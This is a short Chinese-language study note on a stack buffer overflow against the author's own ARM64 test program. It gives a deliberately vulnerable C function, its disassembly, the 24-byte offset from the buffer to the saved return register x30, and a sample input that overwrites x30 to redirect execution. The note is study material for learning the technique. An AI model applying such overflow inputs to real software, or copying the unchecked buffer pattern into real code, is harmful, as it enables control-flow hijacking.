# 栈溢出攻击

通过覆盖 stack 里的 lr 改变 函数的调用返回
./main
0123456789abcdef01234567|(another function vaddr)

|(需要重定向的返回函数地址)

## 我写的测试靶子

void normal_call()
{
    char buff[0x10] = {0};
    attack(buff);
    printf("%s is over ...\n", __FUNCTION__);
}
分析对应的汇编代码
normal_call:                            // @normal_call
    .cfi_startproc
    // %bb.0:
    sub sp, sp, #32
    stp x29, x30, [sp, #16]             // 16-byte Folded Spill
    add x29, sp, #16
    .cfi_def_cfa w29, 16
    .cfi_offset w30, -8
    .cfi_offset w29, -16
    mov x0, sp
    str xzr, [sp]
    str xzr, [sp, #8]
    bl attack
    adrp x0, .L.str.6
    add x0, x0, :lo12:.L.str.6
    adrp x1, .L__FUNCTION__.normal_call
    add x1, x1, :lo12:.L__FUNCTION__.normal_call
    bl printf
    ldp x29, x30, [sp, #16]             // 16-byte Folded Reload
    add sp, sp, #32
    ret

发现 buff 在栈中的位置 和 x30 相差 24 个字节
0123456789abcdef01234567|5cacacea34
这行输入的前16个字节是放到 buff 数据里, | 后的输入会转换成机器码覆盖 x30 的值
